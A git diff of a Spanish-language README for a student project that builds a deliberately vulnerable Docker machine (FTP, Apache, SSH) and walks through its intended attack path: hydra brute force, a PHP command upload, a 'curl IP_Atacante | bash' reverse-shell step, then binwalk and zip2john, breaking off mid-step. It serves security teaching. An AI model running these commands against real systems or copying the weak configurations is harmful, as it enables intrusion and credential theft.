@@ -144,7 +144,7 @@
 - Instalacion de docker a nuestro sistema Ubuntu.
 - Creación de cuenta de DockerHub para guardar las imagenes en la nube y poder compartiras con el grupo.
 - Creación acrivo dockerfile:
-- 
+
 FROM marcositb/grupo4_insecure_design:v1.0
 
 // Exponer los puertos necesarios
@@ -159,23 +159,85 @@ CMD service apache2 start && service vsftpd start && /usr/sbin/sshd -D
 - Abrimos un terminal y nos ponemos como sudo(sudo su).
 - En la misma ruta donde esta el archivo dockerfile ejecutamos el siguiente comando: docker build -t marcositb/grupo4_insecure_design:v1.0 . para crear la imagen.
 - Una vez creada la iniciamos haciendo un docker run marcositb/grupo4_insecure_design:v1.0
+- Entramos dentro de la maquina haciendo un docker exec -it idContenedor bash.
+- Hemos tenido que instalar por nuestra cuenta diferentes herramientas como: vim, python3.10, nano, etc.
+
+## FTP
+
+Lo primero que hemos hecho es mirar si el servicio de ftp esta encendido con service vsftpd status, si esta encendido bien si no hacemos service vsftpd start.
+
+Una vez iniciado creamos un usuario local con adduser elijah, porque queremos tener uno solo para ftp aparte del anonymous.
+
+Para configurar los permisos del anonymous y los del usuario elijah tenemos que modificar los siguientes ficheros (vsftpd.conf, passwd):
+
+- vsftpd.conf lo abrimos con vim /etc/vsftpd.conf y cambiemos lo siguiente
+
+![vsftpd](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/87d2c177-1526-4dda-b3ba-549a1d9d8c65)
+
+- Y passwd le ponemos al usuario elijah /sbin/nologin para que solo se pueda hacer login desde ftp.
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/1b775ca7-0ca6-4f51-a9c3-7b11c87749dd)
+
+## Web (apache2)
+
+Lo único que hemos implementado aqui es un fichero html para que se visualice al poner la ip en el navegador.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/3cd6dd51-1085-4ecd-b9b3-2e8a28da10de)
+
 
 ## Que vulnerabilidades hemos hecho y como las hemos implementado:
 
 Para empezar tenemos una web inspirada en la serie The Originals. Hemos implementado los servicios apache, ftp y ssh.
 
-En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get y ls. Al hacer este ls puede observar que tiene una carpeta con un nombre de usuario.
+En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get.
 
-El atacante debera hacer un hydra en este usuario para sacar la contraseña, este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
+En la web podemos obserbar una galeria con diferentes personajes, donde el atacante puede hacer una lista y probar de hacer un hydra con cada unos de estos personajes, hasta acertar con el usuario.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/0ce0aa3a-6ba9-45a4-988c-ba699a50ad58)
+
+
+Este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
 
 Tendra que subir un archivo php para ejecutar comandos desde la web. 
 
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/895f89b4-6099-4433-8876-5c1d98dd4e64)
+
+
 La maquina atacante tendra lo siguiente:
 
-- Un archivo html con codigo bash dento.
+- Un archivo html con codigo bash dento, y en la misma ruta del archivo abrir un terminal con lo siguiente, para iniciar un servidor web en la maquina atacante.
+
+  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/04bff278-aade-47fc-9fab-a15f5a87b7eb)
+
 - Un terminal abierto para ponernos en escucha en http.
-
-Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash.
-Y en el terminal podemos observar que nos hemos registrado como www-data.
-
   
+  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/bcb607a2-b054-43bb-8726-999ae8719b34)
+
+
+Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash, se quedara la pagina pensando.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/98c2016d-2b16-4637-b2de-9cb3e59ed2c1)
+
+Y en el terminal atacante podemos observar que nos hemos registrado como www-data.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/10a24d5e-d24d-470c-bf91-abfa8bbd7af7)
+
+Dentro de este usuario encontramos que no podemos acceder a ningun archivo con privilegios, pero obserbamos que hay un usuario llamado Caroline.
+Y en el directorio /etc encontramos una imaghen de carolina la cual si la descargamos a la maquina local y le hacemos un binwalk vemos que tiene un zip dentro.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/f7c96f07-1548-4f95-a17f-7c4541b04aed)
+
+Para extraer este zip ponemos binwalk -e carolina.jpg, y nos crea una carpeta con el zip.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/cbafc43e-0b8f-4cfa-a3e2-2ddaeae11bf6)
+
+
+Al intentar extraerlo nos damos cuenta que tiene contraseña.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/63bec0e4-7179-4ddc-913d-92cfd4727ef8)
+
+
+Por eso el atacante tendra que usar zip2jhon para sacar el hash de este zip.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/4bc0cfa5-8cd2-4729-9c48-a7c9f34f3b82)
+
+Y con el hash 
